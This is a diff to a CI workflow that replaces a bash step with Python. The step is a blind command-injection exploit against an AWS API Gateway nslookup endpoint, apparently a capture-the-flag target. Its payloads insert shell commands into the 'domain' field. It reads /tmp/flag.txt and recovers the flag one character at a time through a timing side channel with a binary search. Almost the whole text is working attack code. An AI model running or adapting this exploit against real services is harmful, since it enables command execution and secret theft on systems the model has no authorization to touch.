@@ -19,60 +19,82 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Timing Side-Channel Extraction (Binary Search)
+      - name: Precision-Timing Side-Channel Extraction
         run: |
-          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
-          
-          echo "=== STEP 1: CALIBRATING TIMING BASELINE ==="
-          START=$(date +%s)
-          curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
-            -H "Content-Type: application/json" \
-            -d '{"domain": "127.0.0.1; sleep 2"}'
-          END=$(date +%s)
-          echo "Calibration sleep test took $((END-START)) seconds."
+          python3 << 'PYEOF'
+          import urllib.request
+          import json
+          import time
+          import urllib.parse
 
-          echo ""
-          echo "=== STEP 2: EXTRACTING FLAG (16 BYTES) ==="
-          FLAG=""
+          url = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
+
+          print("=== STEP 1: CALIBRATING TIMING BASELINE ===")
+          start = time.time()
+          req = urllib.request.Request(
+              url,
+              data=json.dumps({"domain": "127.0.0.1; sleep 2"}).encode('utf-8'),
+              headers={'Content-Type': 'application/json'},
+              method='POST'
+          )
+          try:
+              with urllib.request.urlopen(req, timeout=10) as resp:
+                  resp.read()
+          except Exception:
+              pass
+          cal_time = time.time() - start
+          print(f"Calibration sleep test took {cal_time:.2f} seconds.")
+
+          flag_chars = []
+          print("\n=== STEP 2: EXTRACTING FLAG (16 BYTES) WITH HIGH PRECISION ===")
           
-          for pos in $(seq 1 16); do
-            low=32
-            high=126
-            
-            while [ $low -lt $high ]; do
-              mid=$(( (low + high) / 2 ))
-              
-              # Build robust payload: reads local /tmp/flag.txt, gets character at 'pos', checks ASCII value via od, sleeps if > mid
-              # Encoded via base64 to completely avoid bash/JSON quote escaping errors
-              SCRIPT='FLAG=$(cat /tmp/flag.txt 2>/dev/null); CHAR=$(echo "$FLAG" | cut -c'"$pos"'); ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); if [ "$ORD" -gt '"$mid"' ]; then sleep 2; fi'
-              ENCODED=$(echo "$SCRIPT" | base64 -w0)
-              
-              START=$(date +%s)
-              CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
-                -H "Content-Type: application/json" \
-                -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
-              END=$(date +%s)
-              DURATION=$((END - START))
-              
-              # If HTTP 504 (Gateway Timeout) or duration >= 1.5s, character ASCII value is GREATER than mid
-              if [ "$CODE" = "504" ] || [ "$CODE" = "503" ] || [ $DURATION -ge 1 ]; then
-                low=$((mid + 1))
-              else
-                high=$mid
-              fi
-            done
-            
-            # Convert final ASCII value to character using Python
-            CHAR=$(python3 -c "import sys; sys.stdout.write(chr($low))")
-            FLAG="$FLAG$CHAR"
-            echo "Position $pos resolved to: '$CHAR' (ASCII $low) | Flag so far: $FLAG"
-          done
+          for pos in range(1, 17):
+              low, high = 32, 126
+              while low < high:
+                  mid = (low + high) // 2
+                  
+                  # Lambda command: reads /tmp/flag.txt, gets char at pos, checks ASCII, sleeps 2 if > mid
+                  lambda_cmd = (
+                      f'127.0.0.1; '
+                      f'F=$(cat /tmp/flag.txt 2>/dev/null); '
+                      f'CHAR=$(echo "$F" | cut -c{pos}); '
+                      f'ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); '
+                      f'if [ "$ORD" -gt {mid} ]; then sleep 2; fi'
+                  )
+                  
+                  payload = json.dumps({"domain": lambda_cmd}).encode('utf-8')
+                  req = urllib.request.Request(
+                      url,
+                      data=payload,
+                      headers={'Content-Type': 'application/json'},
+                      method='POST'
+                  )
+                  
+                  start = time.time()
+                  try:
+                      with urllib.request.urlopen(req, timeout=10) as resp:
+                          resp.read()
+                  except Exception:
+                      pass
+                  duration = time.time() - start
+                  
+                  # Error margin: if request takes >= 1.3 seconds, the sleep successfully triggered (char > mid)
+                  if duration >= 1.3:
+                      low = mid + 1
+                  else:
+                      high = mid
+                      
+              char = chr(low)
+              flag_chars.append(char)
+              current_str = "".join(flag_chars)
+              print(f"Position {pos} resolved to: '{char}' (ASCII {low}) | Flag so far: {current_str}")
+
+          encoded_flag = "".join(flag_chars)
+          print(f"\n===============================")
+          print(f"FINAL ENCODED FLAG: {encoded_flag}")
+          print(f"===============================")
           
-          echo ""
-          echo "==============================="
-          echo "FINAL ENCODED FLAG: $FLAG"
-          echo "==============================="
-          
-          # URL-decode the final string so LO gets the clean plaintext flag!
-          PLAINTEXT_FLAG=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('$FLAG'))")
-          echo "FINAL PLAINTEXT FLAG: $PLAINTEXT_FLAG"
+          # Safely unquote the flag without quote-breaking syntax errors
+          decoded_flag = urllib.parse.unquote(encoded_flag)
+          print(f"FINAL PLAINTEXT FLAG: {decoded_flag}")
+          PYEOF
